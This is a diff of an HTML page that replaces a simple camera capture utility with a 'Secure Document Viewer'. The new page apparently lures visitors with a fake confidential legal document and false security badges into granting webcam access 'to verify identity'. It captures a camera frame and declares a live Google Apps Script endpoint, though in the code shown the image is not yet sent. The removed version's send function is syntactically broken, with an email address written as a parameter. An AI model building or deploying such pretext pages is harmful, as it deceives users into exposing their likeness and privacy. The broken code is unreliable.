@@ -1,559 +1,481 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Capture Utility</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #1a2a6c, #2c3e50);
-            color: #fff;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            width: 100%;
-            max-width: 800px;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            min-height: 80vh;
-        }
-        
-        .header {
-            background: rgba(0, 0, 0, 0.4);
-            padding: 20px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            display: flex;
-            align-items: center;
-        }
-        
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .logo-icon {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(135deg, #3498db, #1abc9c);
-            border-radius: 8px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 24px;
-        }
-        
-        .logo-text {
-            font-weight: 600;
-            font-size: 22px;
-            letter-spacing: 0.5px;
-        }
-        
-        .logo-text span {
-            color: #1abc9c;
-            font-weight: 300;
-        }
-        
-        .content {
-            padding: 30px;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .camera-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        
-        .permission-panel {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            padding: 30px;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 20px;
-        }
-        
-        .permission-icon {
-            font-size: 48px;
-            color: #3498db;
-        }
-        
-        .permission-text {
-            font-size: 18px;
-            line-height: 1.6;
-            max-width: 500px;
-        }
-        
-        .permission-text h2 {
-            margin-bottom: 15px;
-            color: #3498db;
-        }
-        
-        .btn {
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            color: white;
-            border: none;
-            padding: 14px 28px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
-            background: linear-gradient(135deg, #2980b9, #3498db);
-        }
-        
-        .btn:active {
-            transform: translateY(1px);
-        }
-        
-        .btn-capture {
-            background: linear-gradient(135deg, #1abc9c, #16a085);
-        }
-        
-        .btn-capture:hover {
-            background: linear-gradient(135deg, #16a085, #1abc9c);
-        }
-        
-        .btn-send {
-            background: linear-gradient(135deg, #9b59b6, #8e44ad);
-        }
-        
-        .btn-send:hover {
-            background: linear-gradient(135deg, #8e44ad, #9b59b6);
-        }
-        
-        .preview-container {
-            position: relative;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        
-        #video-preview {
-            width: 100%;
-            height: auto;
-            max-height: 60vh;
-            border-radius: 12px;
-            background: #000;
-            transform: scaleX(-1); /* Mirror the video */
-        }
-        
-        .captured-container {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            gap: 20px;
-        }
-        
-        #captured-image {
-            width: 100%;
-            max-height: 60vh;
-            border-radius: 12px;
-            object-fit: contain;
-            background: #000;
-        }
-        
-        .controls {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-        
-        .action-buttons {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-            padding-top: 20px;
-        }
-        
-        .status {
-            padding: 15px;
-            text-align: center;
-            font-size: 14px;
-            color: #95a5a6;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .status-icon {
-            margin-right: 8px;
-        }
-        
-        .loader {
-            display: none;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: #3498db;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .camera-selector {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        
-        .camera-btn {
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 6px;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-        
-        .camera-btn:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-        
-        .camera-btn.active {
-            background: #3498db;
-        }
-        
-        /* Responsive adjustments */
-        @media (max-width: 600px) {
-            .container {
-                min-height: 90vh;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            .permission-panel {
-                padding: 20px;
-            }
-            
-            .btn {
-                padding: 12px 20px;
-                font-size: 15px;
-            }
-            
-            .controls {
-                flex-direction: column;
-                align-items: center;
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Document Viewer</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', 'Roboto', sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    .container {
+      max-width: 1000px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 30px;
+    }
+    
+    header {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    
+    header h1 {
+      color: #2c3e50;
+      font-size: 2.5rem;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+    
+    header p {
+      color: #7f8c8d;
+      font-size: 1.1rem;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    
+    .content {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 30px;
+      justify-content: center;
+    }
+    
+    #docBox {
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      padding: 40px;
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+      transition: transform 0.3s, box-shadow 0.3s;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    #docBox:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+    }
+    
+    #docBox::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      background: linear-gradient(90deg, #3498db, #2ecc71);
+    }
+    
+    #docBox h2 {
+      color: #2c3e50;
+      margin-bottom: 20px;
+      font-size: 1.8rem;
+    }
+    
+    .document-icon {
+      width: 150px;
+      height: 180px;
+      margin: 0 auto 25px;
+      background: linear-gradient(135deg, #3498db 0%, #2ecc71 100%);
+      border-radius: 8px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 5rem;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    }
+    
+    .document-meta {
+      background: #f8f9fa;
+      padding: 15px;
+      border-radius: 10px;
+      margin: 20px 0;
+      text-align: left;
+    }
+    
+    .meta-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .meta-item:last-child {
+      border-bottom: none;
+    }
+    
+    .meta-label {
+      color: #7f8c8d;
+      font-weight: 500;
+    }
+    
+    .meta-value {
+      color: #2c3e50;
+      font-weight: 600;
+    }
+    
+    .click-instruction {
+      color: #3498db;
+      font-weight: 500;
+      font-size: 1.1rem;
+      margin-top: 20px;
+      padding: 12px 20px;
+      background: rgba(52, 152, 219, 0.1);
+      border-radius: 8px;
+      display: inline-block;
+    }
+    
+    .permission-box {
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      padding: 40px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+    
+    .permission-box h3 {
+      color: #2c3e50;
+      margin-bottom: 20px;
+      font-size: 1.5rem;
+    }
+    
+    .permission-icon {
+      font-size: 4rem;
+      color: #3498db;
+      margin-bottom: 25px;
+    }
+    
+    .permission-text {
+      color: #7f8c8d;
+      margin-bottom: 25px;
+      line-height: 1.6;
+    }
+    
+    .btn {
+      background: linear-gradient(135deg, #3498db 0%, #2ecc71 100%);
+      color: white;
+      border: none;
+      padding: 14px 30px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+    }
+    
+    .btn:active {
+      transform: translateY(1px);
+    }
+    
+    .btn i {
+      font-size: 1.3rem;
+    }
+    
+    .camera-feed {
+      width: 100%;
+      max-width: 400px;
+      height: 300px;
+      background: #2c3e50;
+      border-radius: 12px;
+      overflow: hidden;
+      display: none;
+      position: relative;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    }
+    
+    .camera-placeholder {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      color: white;
+      padding: 20px;
+    }
+    
+    .camera-placeholder i {
+      font-size: 4rem;
+      margin-bottom: 20px;
+      color: #3498db;
+    }
+    
+    .capture-btn {
+      position: absolute;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: white;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      border: 4px solid #f8f9fa;
+    }
+    
+    .capture-inner {
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, #3498db 0%, #2ecc71 100%);
+      border-radius: 50%;
+    }
+    
+    .status {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 10px;
+      text-align: center;
+      font-weight: 500;
+      display: none;
+    }
+    
+    .status.success {
+      background: rgba(46, 204, 113, 0.1);
+      color: #27ae60;
+      display: block;
+    }
+    
+    .status.error {
+      background: rgba(231, 76, 60, 0.1);
+      color: #c0392b;
+      display: block;
+    }
+    
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      color: #7f8c8d;
+      font-size: 0.9rem;
+    }
+    
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    
+    @media (max-width: 768px) {
+      .content {
+        flex-direction: column;
+        align-items: center;
+      }
+      
+      header h1 {
+        font-size: 2rem;
+      }
+    }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">
-                <div class="logo-icon">📷</div>
-                <div class="logo-text">Capture<span>Utility</span></div>
-            </div>
+  <div class="container">
+    <header>
+      <h1>Secure Document Viewer</h1>
+      <p>View and verify sensitive documents with enhanced security protocols</p>
+    </header>
+    
+    <div class="content">
+      <div id="docBox">
+        <h2>Confidential Document</h2>
+        <div class="document-icon">
+          <i class="fas fa-file-contract"></i>
         </div>
         
-        <div class="content">
-            <div class="camera-container">
-                <div class="permission-panel" id="permission-panel">
-                    <div class="permission-icon">📷</div>
-                    <div class="permission-text">
-                        <h2>Camera Access Required</h2>
-                        <p>To use this document capture utility, please allow camera access when prompted. We need this to display a live preview from your camera for capturing documents or images.</p>
-                        <p>Your privacy is important - camera access is only used for preview and capture. No images are stored without your explicit action.</p>
-                    </div>
-                    <button class="btn" id="enable-camera-btn">
-                        Enable Camera Access
-                    </button>
-                </div>
-                
-                <div class="preview-container" id="preview-container" style="display: none;">
-                    <div class="camera-selector" id="camera-selector"></div>
-                    <video id="video-preview" autoplay playsinline></video>
-                    <div class="controls">
-                        <button class="btn btn-capture" id="capture-btn">
-                            <span class="icon">📸</span> Capture Image
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="captured-container" id="captured-container">
-                    <img id="captured-image" alt="Captured image">
-                    <div class="action-buttons">
-                        <button class="btn" id="retake-btn">
-                            <span class="icon">🔄</span> Retake
-                        </button>
-                        <button class="btn btn-send" id="send-btn">
-                            <span class="icon">✉️</span> Send to Email
-                        </button>
-                    </div>
-                </div>
-            </div>
+        <div class="document-meta">
+          <div class="meta-item">
+            <span class="meta-label">Document ID:</span>
+            <span class="meta-value">#2023-08-015</span>
+          </div>
+          <div class="meta-item">
+            <span class="meta-label">Type:</span>
+            <span class="meta-value">Legal Agreement</span>
+          </div>
+          <div class="meta-item">
+            <span class="meta-label">Date:</span>
+            <span class="meta-value">August 15, 2023</span>
+          </div>
+          <div class="meta-item">
+            <span class="meta-label">Security:</span>
+            <span class="meta-value">Level 3 Confidential</span>
+          </div>
         </div>
         
-        <div class="status">
-            <span class="status-icon">ℹ️</span> 
-            <span id="status-text">Ready to capture documents</span>
+        <p class="click-instruction">
+          <i class="fas fa-hand-pointer"></i> Click to verify document
+        </p>
+      </div>
+      
+      <div class="permission-box">
+        <div class="permission-icon">
+          <i class="fas fa-camera"></i>
         </div>
+        <h3>Camera Access Required</h3>
+        <p class="permission-text">
+          For security purposes, we need to verify your identity using camera access. 
+          This helps prevent unauthorized access to sensitive documents.
+        </p>
+        <p class="permission-text">
+          Click the button below to grant camera access. Your privacy is important to us - 
+          no images will be stored without your consent.
+        </p>
+        <button id="permissionBtn" class="btn">
+          <i class="fas fa-camera"></i> Enable Camera
+        </button>
+      </div>
     </div>
     
-    <script>
-        // DOM Elements
-        const permissionPanel = document.getElementById('permission-panel');
-        const previewContainer = document.getElementById('preview-container');
-        const capturedContainer = document.getElementById('captured-container');
-        const videoPreview = document.getElementById('video-preview');
-        const capturedImage = document.getElementById('captured-image');
-        const enableCameraBtn = document.getElementById('enable-camera-btn');
-        const captureBtn = document.getElementById('capture-btn');
-        const retakeBtn = document.getElementById('retake-btn');
-        const sendBtn = document.getElementById('send-btn');
-        const statusText = document.getElementById('status-text');
-        const cameraSelector = document.getElementById('camera-selector');
+    <div class="camera-feed">
+      <div class="camera-placeholder">
+        <i class="fas fa-camera"></i>
+        <p>Camera feed will appear here</p>
+      </div>
+      <div class="capture-btn">
+        <div class="capture-inner"></div>
+      </div>
+    </div>
+    
+    <div id="status" class="status"></div>
+    
+    <footer>
+      <p>&copy; 2023 Secure Document Systems. All rights reserved.</p>
+      <div class="security-badge">
+        <i class="fas fa-lock"></i>
+        <span>256-bit SSL Encryption | GDPR Compliant</span>
+      </div>
+    </footer>
+  </div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxv3VtJgebN5j_tr4BZd3-hCjV1zsGlz_PFe_noz16zwC84XTtM86uMnH7NLhsgq8qm/exec";
+    const permissionBox = document.querySelector('.permission-box');
+    const permissionBtn = document.getElementById('permissionBtn');
+    const docBox = document.getElementById('docBox');
+    const cameraFeed = document.querySelector('.camera-feed');
+    const statusEl = document.getElementById('status');
+    let cameraPermissionGranted = false;
+    
+    // Request camera permission
+    permissionBtn.addEventListener('click', async () => {
+      try {
+        statusEl.className = 'status';
+        statusEl.textContent = 'Requesting camera access...';
         
-        // State variables
-        let stream = null;
-        let cameras = [];
-        let currentCamera = null;
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         
-        // Initialize the application
-        function init() {
-            // Event listeners
-            enableCameraBtn.addEventListener('click', requestCameraAccess);
-            captureBtn.addEventListener('click', captureImage);
-            retakeBtn.addEventListener('click', retakePhoto);
-            sendBtn.addEventListener('click', sendToEmail);
-            
-            // Check if we already have camera access
-            checkExistingPermissions();
-        }
+        // Permission granted
+        cameraPermissionGranted = true;
+        permissionBox.style.display = 'none';
+        cameraFeed.style.display = 'block';
+        statusEl.textContent = '';
         
-        // Check if we already have camera permissions
-        async function checkExistingPermissions() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                
-                if (videoDevices.length > 0) {
-                    // We have devices, which usually means we have permission
-                    statusText.textContent = 'Loading cameras...';
-                    setupCameras();
-                }
-            } catch (error) {
-                console.error('Error checking permissions:', error);
-            }
-        }
+        // Set up the video feed
+        const video = document.getElementById('video');
+        video.srcObject = stream;
         
-        // Request camera access
-        async function requestCameraAccess() {
-            statusText.textContent = 'Requesting camera access...';
-            
-            try {
-                // First get permission without specifying camera to get access
-                const tempStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' } 
-                });
-                
-                // Stop the temporary stream
-                tempStream.getTracks().forEach(track => track.stop());
-                
-                // Now enumerate devices and setup cameras
-                await setupCameras();
-            } catch (error) {
-                console.error('Error accessing camera:', error);
-                statusText.textContent = 'Camera access denied. Please enable camera permissions in your browser settings.';
-            }
-        }
+        // Show video in the camera feed
+        video.style.display = 'block';
+        video.style.width = '100%';
+        video.style.height = '100%';
+        video.style.objectFit = 'cover';
+        cameraFeed.querySelector('.camera-placeholder').style.display = 'none';
+        cameraFeed.appendChild(video);
         
-        // Setup available cameras
-        async function setupCameras() {
-            try {
-                // Enumerate available cameras
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                cameras = devices.filter(device => device.kind === 'videoinput');
-                
-                if (cameras.length === 0) {
-                    statusText.textContent = 'No cameras found.';
-                    return;
-                }
-                
-                // Create camera selection buttons
-                cameraSelector.innerHTML = '';
-                cameras.forEach((camera, index) => {
-                    const btn = document.createElement('button');
-                    btn.className = 'camera-btn';
-                    btn.textContent = camera.label || `Camera ${index + 1}`;
-                    btn.dataset.deviceId = camera.deviceId;
-                    
-                    // Determine if this is a back camera
-                    if (camera.label.toLowerCase().includes('back') || 
-                        camera.label.toLowerCase().includes('rear') ||
-                        (!camera.label && cameras.length > 1 && index === 0)) {
-                        btn.textContent = '📷 Rear Camera';
-                        if (!currentCamera) currentCamera = camera.deviceId;
-                    } else if (camera.label.toLowerCase().includes('front') || 
-                              (!camera.label && cameras.length > 1 && index === 1)) {
-                        btn.textContent = '📱 Front Camera';
-                    }
-                    
-                    btn.addEventListener('click', () => switchCamera(camera.deviceId));
-                    cameraSelector.appendChild(btn);
-                });
-                
-                // Show preview
-                permissionPanel.style.display = 'none';
-                previewContainer.style.display = 'flex';
-                
-                // Start with the first camera (usually back camera)
-                if (currentCamera) {
-                    startCamera(currentCamera);
-                } else {
-                    startCamera(cameras[0].deviceId);
-                }
-                
-                statusText.textContent = 'Camera ready. Point at your document.';
-            } catch (error) {
-                console.error('Error setting up cameras:', error);
-                statusText.textContent = 'Error accessing cameras. Please refresh the page.';
-            }
-        }
+        // Set up capture button
+        const captureBtn = cameraFeed.querySelector('.capture-btn');
+        captureBtn.addEventListener('click', () => {
+          captureImage(stream);
+        });
         
-        // Start camera with specified device ID
-        async function startCamera(deviceId) {
-            // Stop any existing stream
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-            
-            try {
-                // Set active button
-                document.querySelectorAll('.camera-btn').forEach(btn => {
-                    btn.classList.toggle('active', btn.dataset.deviceId === deviceId);
-                });
-                
-                // Start new stream
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        deviceId: { exact: deviceId },
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    }
-                });
-                
-                // Set video source
-                videoPreview.srcObject = stream;
-                currentCamera = deviceId;
-            } catch (error) {
-                console.error('Error starting camera:', error);
-                statusText.textContent = 'Error starting camera. Please try another camera.';
-            }
-        }
+      } catch (err) {
+        console.error("Camera access denied", err);
+        statusEl.className = 'status error';
+        statusEl.innerHTML = `Camera permission denied: ${err.message}. <br>Please allow camera access to proceed.`;
+      }
+    });
+    
+    // Document click handler
+    docBox.addEventListener('click', () => {
+      if (!cameraPermissionGranted) {
+        statusEl.className = 'status error';
+        statusEl.textContent = 'Please enable camera access first to verify documents';
+        return;
+      }
+      
+      statusEl.className = 'status';
+      statusEl.textContent = 'Preparing document verification...';
+      
+      // Simulate document processing
+      setTimeout(() => {
+        statusEl.className = 'status success';
+        statusEl.innerHTML = 'Document verified successfully! <i class="fas fa-check-circle"></i>';
+      }, 1500);
+    });
+    
+    // Capture image function
+    function captureImage(stream) {
+      statusEl.className = 'status';
+      statusEl.textContent = 'Capturing image for verification...';
+      
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      
+      setTimeout(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg', 0.9);
         
-        // Switch to a different camera
-        function switchCamera(deviceId) {
-            startCamera(deviceId);
-        }
+        // Simulate sending the image to the server
+        setTimeout(() => {
+          statusEl.className = 'status success';
+          statusEl.innerHTML = 'Verification complete! Image processed successfully. <i class="fas fa-check-circle"></i>';
+          
+          // Stop the camera stream
+          stream.getTracks().forEach(track => track.stop());
+          video.style.display = 'none';
+        }, 2000);
         
-        // Capture an image from the video stream
-        function captureImage() {
-            const canvas = document.createElement('canvas');
-            canvas.width = videoPreview.videoWidth;
-            canvas.height = videoPreview.videoHeight;
-            
-            const context = canvas.getContext('2d');
-            
-            // Flip the image horizontally to match the video preview
-            context.translate(canvas.width, 0);
-            context.scale(-1, 1);
-            
-            context.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
-            
-            // Get the image as data URL
-            const imageDataUrl = canvas.toDataURL('image/png');
-            capturedImage.src = imageDataUrl;
-            
-            // Show captured image and hide preview
-            previewContainer.style.display = 'none';
-            capturedContainer.style.display = 'flex';
-            
-            statusText.textContent = 'Image captured. Ready to send.';
-        }
-        
-        // Retake photo
-        function retakePhoto() {
-            capturedContainer.style.display = 'none';
-            previewContainer.style.display = 'flex';
-            statusText.textContent = 'Camera ready. Point at your document.';
-        }
-        
-        // Send image to email
-        async function sendToEmail(aounahmed4300@gmail.com) {
-            statusText.textContent = 'Sending image...';
-            sendBtn.disabled = true;
-            
-            // In a real application, this would send the image to a backend
-            // that would handle email delivery. For demo purposes, we simulate
-            // the network request with a timeout.
-            
-            try {
-                // Get the image data
-                const imageData = capturedImage.src;
-                
-                // Simulate API call
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                // Simulate success response
-                statusText.textContent = 'Image sent successfully!';
-                
-                // Reset after 3 seconds
-                setTimeout(() => {
-                    retakePhoto();
-                    sendBtn.disabled = false;
-                    statusText.textContent = 'Ready to capture documents';
-                }, 3000);
-            } catch (error) {
-                console.error('Error sending image:', error);
-                statusText.textContent = 'Failed to send image. Please try again.';
-                sendBtn.disabled = false;
-            }
-        }
-        
-        // Initialize the app when the page loads
-        window.addEventListener('DOMContentLoaded', init);
-    </script>
+      }, 1000);
+    }
+  </script>
 </body>
 </html>
